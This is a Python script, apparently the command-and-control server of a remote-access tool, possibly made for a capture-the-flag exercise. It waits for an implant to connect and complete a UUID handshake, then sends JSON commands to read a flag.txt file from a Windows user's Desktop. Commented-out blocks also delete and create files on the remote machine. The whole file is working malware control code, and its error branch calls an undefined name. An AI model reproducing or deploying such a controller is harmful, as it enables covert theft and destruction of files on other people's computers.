# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-08-04 14:37:18

from enum import Enum
import base64
import socket
import json
import time

HOST = '0.0.0.0'
PORT = 63792

hs = '''
{
    "handshake": "%s"
}
'''

run_cmd = '''
{
    "cmd": "%s",
    "fname": "%s",
    "fdata": "%s"
}
'''

class Commands(Enum):
    INVALID     = 0
    READ_FILE   = 1 # read file
    DELETE_FILE = 2 # delete file from computer
    CREATE_FILE = 3 # create file

def main():
    uuid = ''

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            while True:
                try:
                    data = conn.recv(1024)
                    data_json = json.loads(data.decode())
                    if (data_json['request'] == 'handshake' and len(data_json['uuid']) != 0):
                        print('Handshake - OK')
                        uuid = data_json['uuid']
                        conn.sendall((hs % 'OK').encode())
                        break
                    else:
                        conn.sendall(handshake.format('WRONG'))
                except:
                    print('Error while receving handshake!')
                    time.sleep(2)

            data = conn.recv(8192)
            data_json = json.loads(data.decode())
            print(data_json)
            if (data_json["initialized"] != 1):
                print("Initialization error!")
                exit(1)

            # time.sleep(10)
            # conn.sendall((run_cmd % (Commands.CREATE_FILE.name, 'C:\\\\Users\\\\John\\\\Desktop\\\\kek1.txt', 'just some text')).encode())
            # data = conn.recv(8192)
            # data_json = json.loads(data.decode())
            # print(data_json)

            time.sleep(10)
            conn.sendall((run_cmd % (Commands.READ_FILE.name, 'C:\\\\Users\\\\madrat\\\\Desktop\\\\flag.txt', '')).encode())
            data = conn.recv(8192)
            data_json = json.loads(data.decode())
            if (len(data_json['content']) != 0):
                print('File content: ' + str(data_json['content']))

            # time.sleep(1)
            # conn.sendall((run_cmd % (Commands.DELETE_FILE.name, 'C:\\\\Users\\\\John\\\\Desktop\\\\flag.txt', '')).encode())
            # data = conn.recv(8192)
            # data_json = json.loads(data.decode())
            # print(data_json)

            # time.sleep(6)
            # conn.sendall((run_cmd % (Commands.CREATE_FILE.name, 'C:\\\\Users\\\\John\\\\Desktop\\\\kek2.txt', 'just some text')).encode())
            # data = conn.recv(8192)
            # data_json = json.loads(data.decode())
            # print(data_json)

            # time.sleep(6)
            # conn.sendall((run_cmd % (Commands.CREATE_FILE.name, 'C:\\\\Users\\\\John\\\\Desktop\\\\kek3.txt', 'just some text')).encode())
            # data = conn.recv(8192)
            # data_json = json.loads(data.decode())
            # print(data_json)

            time.sleep(1000)
            

if __name__ == "__main__":
    main()